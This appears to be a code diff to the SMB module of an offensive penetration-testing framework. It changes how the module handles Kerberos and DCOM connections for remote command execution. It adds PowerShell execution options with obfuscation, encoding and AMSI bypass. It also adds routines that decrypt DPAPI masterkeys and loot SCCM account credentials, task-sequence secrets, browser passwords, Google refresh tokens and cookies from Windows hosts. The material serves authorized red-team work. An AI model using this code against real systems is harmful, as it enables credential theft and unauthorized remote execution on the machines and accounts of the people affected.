@@ -49,12 +49,13 @@ from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.powershell import create_ps_command
 
 from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage
+from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken
 from dploot.triage.credentials import CredentialsTriage
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 from dploot.triage.backupkey import BackupkeyTriage
 from dploot.lib.target import Target
 from dploot.lib.smb import DPLootSMBConnection
+from dploot.triage.sccm import SCCMTriage
 
 from pywerview.cli.helpers import get_localdisks, get_netsession, get_netgroupmember, get_netgroup, get_netcomputer, get_netloggedon, get_netlocalgroup
 
@@ -256,6 +257,14 @@ class smb(connection):
             self.conn.logoff()
         except Exception as e:
             self.logger.debug(f"Error logging off system: {e}")
+        
+        # DCOM connection with kerberos needed
+        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.domain}"
+
+        if not self.kdcHost and self.domain:
+            result = self.resolver(self.domain)
+            self.kdcHost = result["host"] if result else None
+            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
 
     def print_host_info(self):
         signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=["bold"]) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=["bold"])
@@ -266,9 +275,8 @@ class smb(connection):
     def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
         logging.getLogger("impacket").disabled = True
         # Re-connect since we logged off
-        kdc_host = f"{self.hostname}.{self.domain}" if not self.no_ntlm else f"{self.host}"
-        self.logger.debug(f"KDC set to: {kdc_host}")
-        self.create_conn_obj(kdc_host)
+        self.logger.debug(f"KDC set to: {kdcHost}")
+        self.create_conn_obj()
         lmhash = ""
         nthash = ""
 
@@ -475,11 +483,11 @@ class smb(connection):
             self.logger.fail("Broken Pipe Error while attempting to login")
             return False
 
-    def create_smbv1_conn(self, kdc=""):
+    def create_smbv1_conn(self):
         try:
             self.conn = SMBConnection(
-                kdc if kdc else self.host,
-                kdc if kdc else self.host,
+                self.remoteName,
+                self.host,
                 None,
                 self.port,
                 preferredDialect=SMB_DIALECT,
@@ -488,19 +496,19 @@ class smb(connection):
             self.smbv1 = True
         except OSError as e:
             if str(e).find("Connection reset by peer") != -1:
-                self.logger.info(f"SMBv1 might be disabled on {kdc if kdc else self.host}")
+                self.logger.info(f"SMBv1 might be disabled on {self.host}")
             return False
         except (Exception, NetBIOSTimeout) as e:
-            self.logger.info(f"Error creating SMBv1 connection to {kdc if kdc else self.host}: {e}")
+            self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
             return False
 
         return True
 
-    def create_smbv3_conn(self, kdc=""):
+    def create_smbv3_conn(self):
         try:
             self.conn = SMBConnection(
-                kdc if kdc else self.host,
-                kdc if kdc else self.host,
+                self.remoteName,
+                self.host,
                 None,
                 self.port,
                 timeout=self.args.smb_timeout,
@@ -512,15 +520,15 @@ class smb(connection):
                 if not self.logger:
                     print("DEBUG ERROR: logger not set, please open an issue on github: " + str(self) + str(self.logger))
                     self.proto_logger()
-                self.logger.fail(f"SMBv3 connection error on {kdc if kdc else self.host}: {e}")
+                self.logger.fail(f"SMBv3 connection error on {self.host}: {e}")
             return False
         except (Exception, NetBIOSTimeout) as e:
-            self.logger.info(f"Error creating SMBv3 connection to {kdc if kdc else self.host}: {e}")
+            self.logger.info(f"Error creating SMBv3 connection to {self.host}: {e}")
             return False
         return True
 
-    def create_conn_obj(self, kdc_host=None):
-        return bool(self.create_smbv1_conn(kdc_host) or self.create_smbv3_conn(kdc_host))
+    def create_conn_obj(self):
+        return bool(self.create_smbv1_conn() or self.create_smbv3_conn())
 
     def check_if_admin(self):
         rpctransport = SMBTransport(self.conn.getRemoteHost(), 445, r"\svcctl", smb_connection=self.conn)
@@ -564,7 +572,7 @@ class smb(connection):
             if method == "wmiexec":
                 try:
                     exec_method = WMIEXEC(
-                        self.host if not self.kerberos else self.hostname + "." + self.domain,
+                        self.remoteName,
                         self.smb_share_name,
                         self.username,
                         self.password,
@@ -573,6 +581,7 @@ class smb(connection):
                         self.kerberos,
                         self.aesKey,
                         self.kdcHost,
+                        self.host,
                         self.hash,
                         self.args.share,
                         logger=self.logger,
@@ -587,18 +596,25 @@ class smb(connection):
                     continue
             elif method == "mmcexec":
                 try:
+                    # https://github.com/fortra/impacket/issues/1611
+                    if self.kerberos:
+                        raise Exception("MMCExec current is buggly with kerberos")
                     exec_method = MMCEXEC(
-                        self.host if not self.kerberos else self.hostname + "." + self.domain,
+                        self.remoteName,
                         self.smb_share_name,
                         self.username,
                         self.password,
                         self.domain,
                         self.conn,
-                        self.args.share,
+                        self.kerberos,
+                        self.aesKey,
+                        self.kdcHost,
+                        self.host,
                         self.hash,
-                        self.logger,
-                        self.args.get_output_tries,
-                        self.args.dcom_timeout
+                        self.args.share,
+                        logger=self.logger,
+                        timeout=self.args.dcom_timeout,
+                        tries=self.args.get_output_tries
                     )
                     self.logger.info("Executed command via mmcexec")
                     break
@@ -616,6 +632,7 @@ class smb(connection):
                         self.domain,
                         self.kerberos,
                         self.aesKey,
+                        self.host,
                         self.kdcHost,
                         self.hash,
                         self.logger,
@@ -634,12 +651,12 @@ class smb(connection):
                         self.host if not self.kerberos else self.hostname + "." + self.domain,
                         self.smb_share_name,
                         self.conn,
-                        self.port,
                         self.username,
                         self.password,
                         self.domain,
                         self.kerberos,
                         self.aesKey,
+                        self.host,
                         self.kdcHost,
                         self.hash,
                         self.args.share,
@@ -665,14 +682,19 @@ class smb(connection):
             except UnicodeDecodeError:
                 self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
                 output = output.decode("cp437")
-
-            output = output.strip()
-            self.logger.debug(f"Output: {output}")
+                
+            self.logger.debug(f"Raw Output: {output}")
+            output = "\n".join([ll.rstrip() for ll in output.splitlines() if ll.strip()])
+            self.logger.debug(f"Cleaned Output: {output}")
+            
+            if "This script contains malicious content" in output:
+                self.logger.fail("Command execution blocked by AMSI")
+                return None
 
             if (self.args.execute or self.args.ps_execute) and output:
                 self.logger.success(f"Executed command via {current_method}")
-                buf = StringIO(output).readlines()
-                for line in buf:
+                output_lines = StringIO(output).readlines()
+                for line in output_lines:
                     self.logger.highlight(line.strip())
             return output
         else:
@@ -680,26 +702,30 @@ class smb(connection):
             return False
 
     @requires_admin
-    def ps_execute(
-        self,
-        payload=None,
-        get_output=False,
-        methods=None,
-        force_ps32=False,
-        dont_obfs=False,
-    ):
+    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, obfs=False, encode=False):
+        payload = self.args.ps_execute if not payload and self.args.ps_execute else payload
+        if not payload:
+            self.logger.error("No command to execute specified!")
+            return None
+        
         response = []
-        if not payload and self.args.ps_execute:
-            payload = self.args.ps_execute
-            if not self.args.no_output:
-                get_output = True
-
+        obfs = obfs if obfs else self.args.obfs
+        encode = encode if encode else not self.args.no_encode
+        force_ps32 = force_ps32 if force_ps32 else self.args.force_ps32
+        get_output = True if not self.args.no_output else get_output
+                
+        self.logger.debug(f"Starting ps_execute(): {payload=} {get_output=} {methods=} {force_ps32=} {obfs=} {encode=}")
         amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None
+        self.logger.debug(f"AMSI Bypass: {amsi_bypass}")
+        
         if os.path.isfile(payload):
+            self.logger.debug(f"File payload set: {payload}")
             with open(payload) as commands:
-                response = [self.execute(create_ps_command(c.strip(), force_ps32=force_ps32, dont_obfs=dont_obfs, custom_amsi=amsi_bypass), get_output, methods) for c in commands]
+                response = [self.execute(create_ps_command(c.strip(), force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods) for c in commands]
         else:
-            response = [self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs, custom_amsi=amsi_bypass), get_output, methods)]
+            response = [self.execute(create_ps_command(payload, force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods)]
+            
+        self.logger.debug(f"ps_execute response: {response}")
         return response
 
     def shares(self):
@@ -1073,9 +1099,9 @@ class smb(connection):
             namespace = self.args.wmi_namespace
 
         try:
-            dcom = DCOMConnection(self.host if not self.kerberos else self.hostname + "." + self.domain, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey)
+            dcom = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host)
             iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
-            flag, stringBinding = dcom_FirewallChecker(iInterface, self.args.dcom_timeout)
+            flag, stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.dcom_timeout)
             if not flag or not stringBinding:
                 error_msg = f"WMI Query: Dcom initialization failed on connection with stringbinding: '{stringBinding}', please increase the timeout with the option '--dcom-timeout'. If it's still failing maybe something is blocking the RPC connection, try another exec method"
 
@@ -1101,7 +1127,8 @@ class smb(connection):
                     record = wmi_results.getProperties()
                     records.append(record)
                     for k, v in record.items():
-                        self.logger.highlight(f"{k} => {v['value']}")
+                        if k != "TimeGenerated":  # from the wcc module, but this is a small hack to get it to stop spamming - TODO: add in method to disable output for this function
+                            self.logger.highlight(f"{k} => {v['value']}")
                 except Exception as e:
                     if str(e).find("S_FALSE") < 0:
                         raise e
@@ -1155,20 +1182,16 @@ class smb(connection):
             max_rid = int(self.args.rid_brute)
 
         KNOWN_PROTOCOLS = {
-            135: {"bindstr": r"ncacn_ip_tcp:%s", "set_host": False},
-            139: {"bindstr": r"ncacn_np:{}[\pipe\lsarpc]", "set_host": True},
-            445: {"bindstr": r"ncacn_np:{}[\pipe\lsarpc]", "set_host": True},
+            135: {"bindstr": rf"ncacn_ip_tcp:{self.host}"},
+            139: {"bindstr": rf"ncacn_np:{self.host}[\pipe\lsarpc]"},
+            445: {"bindstr": rf"ncacn_np:{self.host}[\pipe\lsarpc]"},
         }
 
         try:
-            full_hostname = self.host if not self.kerberos else self.hostname + "." + self.domain
             string_binding = KNOWN_PROTOCOLS[self.port]["bindstr"]
             logging.debug(f"StringBinding {string_binding}")
             rpc_transport = transport.DCERPCTransportFactory(string_binding)
-            rpc_transport.set_dport(self.port)
-
-            if KNOWN_PROTOCOLS[self.port]["set_host"]:
-                rpc_transport.setRemoteHost(full_hostname)
+            rpc_transport.setRemoteHost(self.host)
 
             if hasattr(rpc_transport, "set_credentials"):
                 # This method exists only for selected protocol sequences.
@@ -1277,6 +1300,7 @@ class smb(connection):
         for src, dest in self.args.get_file:
             self.get_file_single(src, dest)
 
+
     def enable_remoteops(self):
         try:
             self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
@@ -1332,9 +1356,66 @@ class smb(connection):
             self.logger.exception(str(e))
 
     @requires_admin
+    def sccm(self):
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.fail(str(e))
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            target=self.hostname + "." + self.domain if self.kerberos else self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            no_pass=True,
+            use_kcache=self.use_kcache,
+        )
+
+        try:
+            conn = DPLootSMBConnection(target)
+            conn.smb_session = self.conn
+        except Exception as e:
+            self.logger.debug(f"Could not upgrade connection: {e}")
+            return
+        
+        try:
+            self.logger.display("Collecting Machine masterkeys, grab a coffee and be patient...")
+            masterkeys_triage = MasterkeysTriage(
+                target=target,
+                conn=conn,
+                dpapiSystem={},
+            )
+            masterkeys += masterkeys_triage.triage_system_masterkeys()
+        except Exception as e:
+            self.logger.debug(f"Could not get masterkeys: {e}")
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
+            return
+        
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
+        try:
+            # Collect Chrome Based Browser stored secrets
+            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, use_wmi=self.args.sccm == "wmi")
+            sccmcreds, sccmtasks, sccmcollections = sccm_triage.triage_sccm()
+            for sccmcred in sccmcreds:
+                self.logger.highlight(f"[NAA Account] {sccmcred.username.decode('latin-1')}:{sccmcred.password.decode('latin-1')}")
+            for sccmtask in sccmtasks:
+                self.logger.highlight(f"[Task sequences secret] {sccmtask.secret.decode('latin-1')}")
+            for sccmcollection in sccmcollections:
+                self.logger.highlight(f"[Collection Variable] {sccmcollection.variable.decode('latin-1')}:{sccmcollection.value.decode('latin-1')}")
+        except Exception as e:
+            self.logger.debug(f"Error while looting sccm: {e}")
+
+    @requires_admin
     def dpapi(self):
         dump_system = "nosystem" not in self.args.dpapi
-        logging.getLogger("dploot").disabled = True
 
         if self.args.pvk is not None:
             try:
@@ -1425,6 +1506,7 @@ class smb(connection):
                 pvkbytes=self.pvkbytes,
                 passwords=plaintexts,
                 nthashes=nthashes,
+                dpapiSystem={},
             )
             self.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
             masterkeys += masterkeys_triage.triage_masterkeys()
@@ -1484,22 +1566,34 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error while looting browsers: {e}")
         for credential in browser_credentials:
-            cred_url = credential.url + " -" if credential.url != "" else "-"
-            self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
-            self.db.add_dpapi_secrets(
-                target.address,
-                credential.browser.upper(),
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.url,
-            )
+            if isinstance(credential, LoginData):
+                cred_url = credential.url + " -" if credential.url != "" else "-"
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.username,
+                    credential.password,
+                    credential.url,
+                )
+            elif isinstance(credential, GoogleRefreshToken):
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] Google Refresh Token: {credential.service}:{credential.token}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.service,
+                    credential.token,
+                    "Google Refresh Token",
+                )
+
 
         if dump_cookies and cookies:
             self.logger.display("Start Dumping Cookies")
             for cookie in cookies:
                 if cookie.cookie_value != "":
-                    self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
+                    self.logger.highlight(f"[{cookie.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
             self.logger.display("End Dumping Cookies")
         elif dump_cookies:
             self.logger.fail("No cookies found")
@@ -1543,7 +1637,7 @@ class smb(connection):
                 credential.url,
             )
 
-        if not (credentials and system_credentials and browser_credentials and cookies and vaults and firefox_credentials):
+        if not (credentials or system_credentials or browser_credentials or cookies or vaults or firefox_credentials):
             self.logger.fail("No secrets found")
 
     @requires_admin
